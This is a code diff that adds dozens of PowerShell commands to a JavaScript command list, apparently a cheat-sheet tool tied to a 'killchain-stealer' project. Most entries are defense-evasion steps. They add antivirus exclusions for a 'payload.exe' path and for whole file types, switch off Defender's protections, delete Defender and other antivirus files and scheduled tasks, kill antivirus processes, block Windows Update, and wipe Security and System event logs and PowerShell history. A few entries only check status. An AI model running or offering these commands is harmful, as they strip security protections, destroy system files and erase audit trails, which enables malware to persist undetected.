@@ -358,6 +358,276 @@ const COMMANDS = [
     code: "cd C:\\Users\\veren\\seclab\\killchain-stealer\npython generator_killchain_pro.py",
     tags: ["ps"],
     accent: "#00f0ff"
+  },
+  {
+    title: "Check Defender Exclusions",
+    code: "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Check Exclusions (Detailed)",
+    code: "Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Add Exclusion - AppData",
+    code: "Add-MpPreference -ExclusionPath \"$env:APPDATA\"",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Add Exclusion - ProgramData",
+    code: "Add-MpPreference -ExclusionPath \"C:\\ProgramData\"",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Add Exclusion - Windows Tasks",
+    code: "Add-MpPreference -ExclusionPath \"C:\\Windows\\Tasks\"",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Add Exclusion - Payload Path",
+    code: "Add-MpPreference -ExclusionPath \"C:\\Users\\asi\\AppData\\Roaming\\payload.exe\"",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Add Exclusion - User Roaming",
+    code: "Add-MpPreference -ExclusionPath \"C:\\Users\\singh\\AppData\\Roaming\"",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Add Exclusion - BAT Extension",
+    code: "Add-MpPreference -ExclusionExtension \".bat\"",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Add Exclusion - EXE Extension",
+    code: "Add-MpPreference -ExclusionExtension \".exe\"",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Add Exclusion - PowerShell",
+    code: "Add-MpPreference -ExclusionProcess \"powershell.exe\"",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Check Removed Threats",
+    code: "Get-MpThreat | Sort-Object LastDetectedTime -Descending",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Check Threat Detections",
+    code: "Get-MpThreatDetection | Sort-Object InitialDetectionTime -Descending | Select-Object ThreatName, Resources, InitialDetectionTime",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Disable Defender Realtime",
+    code: "Set-MpPreference -DisableRealtimeMonitoring $true",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Disable Defender Behavior Monitoring",
+    code: "Set-MpPreference -DisableBehaviorMonitoring $true",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Disable Defender BlockAtFirstSeen",
+    code: "Set-MpPreference -DisableBlockAtFirstSeen $true",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Disable Defender IOAV",
+    code: "Set-MpPreference -DisableIOAVProtection $true",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Disable Defender PrivacyMode",
+    code: "Set-MpPreference -DisablePrivacyMode $true",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Disable Defender Signature Updates",
+    code: "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Disable Defender Archive Scanning",
+    code: "Set-MpPreference -DisableArchiveScanning $true",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Disable Defender IPS",
+    code: "Set-MpPreference -DisableIntrusionPreventionSystem $true",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Disable Defender Script Scanning",
+    code: "Set-MpPreference -DisableScriptScanning $true",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Disable Defender via Registry",
+    code: "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 1 -Type DWORD",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Stop WinDefend Service",
+    code: "Stop-Service -Name \"WinDefend\" -Force\nSet-Service -Name \"WinDefend\" -StartupType Disabled",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Delete Windows Defender (Destructive)",
+    code: "Takeown /f \"C:\\Program Files\\Windows Defender\" /r /d y\nicacls \"C:\\Program Files\\Windows Defender\" /grant administrators:F /t\nRemove-Item \"C:\\Program Files\\Windows Defender\" -Recurse -Force",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Delete Defender Files Recursive",
+    code: "Get-ChildItem -Path $env:ProgramFiles, $env:ProgramData, ${env:ProgramFiles(x86)} -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.FullName -like \"*Windows Defender*\" } | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Delete Defender Files (Interactive)",
+    code: "$FilesToDelete = Get-ChildItem -Path $env:ProgramFiles, $env:ProgramData, ${env:ProgramFiles(x86)} -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.FullName -like \"*Windows Defender*\" }; if ($FilesToDelete.Count -gt 0) { Write-Host \"Found the following files/dirs to delete:\" -ForegroundColor Red; $FilesToDelete.FullName; $Confirm = Read-Host \"Continue? (y/N)\"; if ($Confirm -eq 'y') { $FilesToDelete | Remove-Item -Force -Recurse -Verbose } } else { Write-Host \"No matching files found.\" -ForegroundColor Green }",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Delete Other AV Files",
+    code: "Get-ChildItem -Path $env:ProgramFiles, $env:ProgramData, ${env:ProgramFiles(x86)} -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -match \"Defender|Symantec|McAfee|Kaspersky|Avast|AVG|Trend|Sophos|Bitdefender|ESET|Norton\" } | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Stop Windows Update",
+    code: "Stop-Service wuauserv -Force\nSet-Service wuauserv -StartupType Disabled\nRemove-Item -Recurse -Force \"C:\\Windows\\SoftwareDistribution\\Download\\*\"",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Delete Windows Update Tasks",
+    code: "schtasks /Delete /TN \"Microsoft\\Windows\\WindowsUpdate\\Scheduled Start\" /F\nschtasks /Delete /TN \"Microsoft\\Windows\\WindowsUpdate\\sih\" /F\nschtasks /Delete /TN \"Microsoft\\Windows\\WindowsUpdate\\sihboot\" /F",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Disable Windows Update Registry",
+    code: "New-Item -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" -Force\nNew-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" -Name NoAutoUpdate -PropertyType DWord -Value 1 -Force",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Block Windows Update Firewall",
+    code: "New-NetFirewallRule -DisplayName \"Block Windows Update\" -Direction Outbound -RemoteAddress 20.190.128.0/18,40.126.0.0/18 -Action Block",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Verify Windows Update Status",
+    code: "Get-Service wuauserv\nGet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\"",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "List PS/BAT/VBS Scheduled Tasks",
+    code: "schtasks /query /fo LIST /v | Select-String -Pattern \"\\.ps1|\\.bat|\\.vbs\"",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Delete PS/BAT/VBS Scheduled Tasks",
+    code: "schtasks /query /fo LIST /v | Select-String \"TaskName|Task To Run\" -Context 0,1 | Where-Object { $_.ToString() -match \"TaskName\" -and $_.Context.PostContext[0] -match '\\.ps1|\\.bat|\\.vbs' } | ForEach-Object { ($_.ToString() -split \":\",2)[1].Trim() } | ForEach-Object { schtasks /delete /tn $_ /f }",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Delete All Scheduled Tasks (DANGEROUS)",
+    code: "schtasks /query /fo LIST /v | Select-String \"TaskName\" | ForEach-Object { ($_.ToString() -split \":\",2)[1].Trim() } | ForEach-Object { schtasks /delete /tn $_ /f }",
+    tags: ["ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Delete Only Defender Tasks",
+    code: "schtasks /query /fo LIST /v | Select-String \"TaskName\" | ForEach-Object { ($_.ToString() -split \":\",2)[1].Trim() } | Where-Object { $_ -like \"*Microsoft\\Windows\\Windows Defender*\" } | ForEach-Object { schtasks /delete /tn $_ /f }",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Delete Other AV Tasks",
+    code: "schtasks /query /fo LIST /v | Select-String \"TaskName\" | ForEach-Object { ($_.ToString() -split \":\",2)[1].Trim() } | Where-Object { $_ -match \"Windows Defender|Defender|Symantec|McAfee|Kaspersky|Avast|AVG|Trend|Sophos|Bitdefender|ESET\" } | ForEach-Object { schtasks /delete /tn $_ /f }",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Check Defender Realtime Status",
+    code: "Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Check Defender Full Status",
+    code: "Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled, NISEnabled, SignatureUpdateDateTime",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Show Installed AV Products",
+    code: "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName, pathToSignedProductExe, productState",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Kill AV Processes",
+    code: "Get-Process | Where-Object { $_.Name -like '*avast*' } | Stop-Process -Force",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Clear Event Viewer Logs",
+    code: "wevtutil cl \"Windows PowerShell\"\nwevtutil cl \"Microsoft-Windows-PowerShell/Operational\"\nwevtutil cl \"Security\"\nwevtutil cl \"System\"\nwevtutil cl \"Application\"",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Clear PowerShell History",
+    code: "Remove-Item (Get-PSReadlineOption).HistorySavePath -Force",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Kill Other PowerShell Processes",
+    code: "$id = $PID\nGet-Process powershell | Where-Object { $_.Id -ne $id } | ForEach-Object { try { $_.Kill() } catch {} }",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "PowerShell Unrestricted Mode",
+    code: "Set-ExecutionPolicy Unrestricted -Scope Process -Force\n[System.Management.Automation.Utils]::CachePowerShellAssembly()\n$env:__PSLockdownPolicy=8\n$ExecutionContext.SessionState.LanguageMode = \"FullLanguage\"",
+    tags: ["ps"],
+    accent: "#00f0ff"
   }
 ];
 
